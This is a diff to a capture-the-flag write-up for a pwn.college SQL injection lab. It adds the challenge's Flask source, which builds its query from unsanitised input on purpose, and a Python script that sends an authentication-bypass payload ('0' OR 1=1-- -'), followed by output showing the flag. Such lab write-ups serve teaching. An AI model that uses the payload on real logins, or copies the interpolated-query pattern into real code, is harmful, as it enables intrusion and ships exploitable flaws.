@@ -1017,29 +1017,6 @@ app.config["SERVER_NAME"] = f"challenge.localhost:80"
 app.run("challenge.localhost", 80)
 ```
 
-```py title="~/script.py" showLineNumbers
-import requests
-
-url = "http://challenge.localhost:80/session"
-data = {
-    "identity": "guest",
-    "pin": int("1337")
-}
-
-response = requests.post(url, data = data)
-print(response.text)
-```
-
-```
-hacker@web-security~sqli-1:/$ python ~/script.py 
-<html><body>Hello, guest!
-        <hr>
-        <form method=post>
-        User:<input type=text name=identity>Pin:<input type=text name=pin><input type=submit value=Submit>
-        </form>
-        </body></html>
-```
-
 ### SQL injection
 
 Let's try the following credentials:
@@ -1077,6 +1054,138 @@ hacker@web-security~sqli-1:/$ python ~/script.py
         <hr>
         <form method=post>
         User:<input type=text name=identity>Pin:<input type=text name=pin><input type=submit value=Submit>
+        </form>
+        </body></html>
+```
+
+&nbsp;
+
+## SQLi 2
+
+### Source code
+```py title="/challenge/server" showLineNumbers
+#!/opt/pwn.college/python
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+import sqlite3
+import tempfile
+
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+
+db = TemporaryDB()
+
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [os.urandom(8)])
+# https://www.sqlite.org/lang_insert.html
+db.execute("""INSERT INTO users SELECT "guest" as username, 'password' as password""")
+
+
+@app.route("/authenticate", methods=["POST"])
+def challenge_post():
+    username = flask.request.form.get("identity")
+    password = flask.request.form.get("pass")
+    if not username:
+        flask.abort(400, "Missing `identity` form parameter")
+    if not password:
+        flask.abort(400, "Missing `pass` form parameter")
+
+    try:
+        # https://www.sqlite.org/lang_select.html
+        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"
+        print(f"DEBUG: {query=}")
+        user = db.execute(query).fetchone()
+    except sqlite3.Error as e:
+        flask.abort(500, f"Query: {query}\nError: {e}")
+
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    flask.session["user"] = username
+    return flask.redirect(flask.request.path)
+
+
+@app.route("/authenticate", methods=["GET"])
+def challenge_get():
+    if not (username := flask.session.get("user", None)):
+        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
+    else:
+        page = f"<html><body>Hello, {username}!"
+        if username == "admin":
+            page += "<br>Here is your flag: " + open("/flag").read()
+
+    return (
+        page
+        + """
+        <hr>
+        <form method=post>
+        User:<input type=text name=identity>Password:<input type=text name=pass><input type=submit value=Submit>
+        </form>
+        </body></html>
+    """
+    )
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+```
+
+### SQL injection
+
+This time, there are single quotes (`'`) around the `password`. We can easily work around this by using comments (`-- -`).
+
+Let's try the following credentials:
+
+| identity | pin |
+|-|-|
+| admin | 0' OR 1=1-- - |
+
+The resultant SQL query will be:
+
+```sql
+SELECT rowid, * FROM users WHERE username = 'admin' AND password = '0' OR 1=1-- -'
+```
+
+Since the result of `1=1` is always true/1 and anything OR with 1 is 1, the query will always be executed even if the password isn't password.
+
+```py title="~/script.py" showLineNumbers
+import requests
+
+url = "http://challenge.localhost:80/authenticate"
+data = {
+    "identity": "admin",
+    "pass": "0' OR 1=1-- -"
+}
+
+with requests.Session() as session:
+    response = session.post(url, data = data)
+    print(response.text)
+```
+
+```
+hacker@web-security~sqli-2:/$ python ~/script.py
+<html><body>Hello, admin!<br>Here is your flag: pwn.college{49UcaQ5MIlt0c-jwN289CZNiRzV.dBTOzMDL4ITM0EzW}
+
+        <hr>
+        <form method=post>
+        User:<input type=text name=identity>Password:<input type=text name=pass><input type=submit value=Submit>
         </form>
         </body></html>
 ```
